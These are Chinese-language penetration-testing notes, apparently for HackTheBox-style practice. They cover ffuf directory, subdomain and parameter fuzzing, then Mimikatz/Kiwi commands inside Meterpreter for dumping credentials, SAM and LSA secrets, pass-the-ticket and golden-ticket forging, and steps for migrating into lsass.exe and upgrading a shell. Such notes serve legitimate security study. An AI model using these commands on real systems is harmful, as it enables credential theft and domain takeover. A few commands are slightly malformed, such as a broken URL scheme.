1.ffuf
基础目录枚举 可以用dirsearch
```bash
# 使用通用目录字典：Discovery/Web-Content/directory-list-2.3-small.txt（轻量、高效）
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt \
  -u https://example.com/FUZZ \
  -mc 200,301,302,403 \          # 匹配有效状态码（200存在/301跳转/403权限不足）
  -fs 0 \                        # 过滤空响应
  -t 100 \                       # 并发数（根据目标服务器调整，避免被封）
  -timeout 5 \                   # 超时时间
  -o dir_enum_result.json        # 输出结果到文件

```
扩展名文件枚举 .php .txt
```bash
# 使用带扩展名的字典：Discovery/Web-Content/web-extensions.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ,/usr/share/seclists/Discovery/Web-Content/web-extensions.txt:EXT \
  -u https://example.com/FUZZ.EXT \
  -mc 200,403 \
  -fs 0

```
子域名枚举
```bash
# 使用子域名字典：Discovery/DNS/subdomains-top1million-5000.txt（前5000个常用子域名）
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u https://FUZZ.example.com \
  -dns \                         # 启用DNS模式（仅解析域名，不发HTTP请求）
  -mc NOERROR \                  # 只显示解析成功的子域名
  -t 200 \
  -o subdomain_enum_result.json

```
爆破GET参数名
```bash
ffuf -u http:/monitorsfour.htb/user?token=FUZZ -w ./numbers.txt  -fs 36  爆的是参数值
# 使用参数名字典：Discovery/Web-Content/burp-parameter-names.txt    参数名
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u https://example.com/index.php?FUZZ=test \  # FUZZ替换参数名，值固定为test
  -mc all \                      # 显示所有状态码（避免漏过异常响应）
  -fw 100 \                      # 过滤包含100个固定关键词的响应（比如404页面）
  -t 50

ffuf也可以用于爆破post密码
```

2. Mimikatz / Kiwi  
kiwi常用命令
```bash
# 1. 加载kiwi模块（meterpreter会话中）
load kiwi

# 2. 核心凭证抓取（等效sekurlsa::logonpasswords）
creds_all  # 抓取所有凭证（明文、哈希、票据）/和hashdump差不多
creds_kerberos  # 仅抓取Kerberos票据
creds_msv  # 抓取MSV认证凭证（NTLM哈希）
creds_ssp  # 抓取SSP凭证（明文密码）

# 3. 哈希提取（等效lsadump::sam）
lsa_dump_sam  # 提取本地SAM数据库哈希
lsa_dump_secrets  # 提取LSA机密（域凭证）

# 4. 票据操作
kerberos_ticket_list  # 列出内存中的票据
kerberos_ticket_purge  # 清空票据
kerberos_ticket_use ticket.kirbi  # 注入票据（Pass-The-Ticket）

# 5. 生成黄金票据
golden_ticket_create -d test.com -k krbtgt哈希 -s S-1-5-21-xxx -u fakeuser -t ticket.kirbi

```
3.Meterpreter命令

```bash
1.ps 查看进程
2.sysinfo 查看系统信息
3.getuid 查看当前权限
4.getpid 查看当前的meterpreter的进程号多少
5.migrate 把meterpreter会话迁移到lsass.exe（是本地认证服务的会话，稳定性高），保存会话存活
6.background或者ctrl+z  从cmd回到meterpreter会哈
7.shell   打开一个cmd的shell
8.文件操作
pwd/getwd 查看当前路径
cd 切换目录
ls/dir 查看文件目录

从shell到meterpreter shell的过程
先把当前会话background，然后搜索对应的shell_to_meterpreter这个模块，
然后使用sessions -l查看当前要升级的session的id多少
接着set session 1 然后可以直接run ，然后这时候发现有两个session ，切换到第二个session即可，
然后这里最好使用ps+migrate pid迁移进程到更稳定的进程去，避免连接和会话中断
```
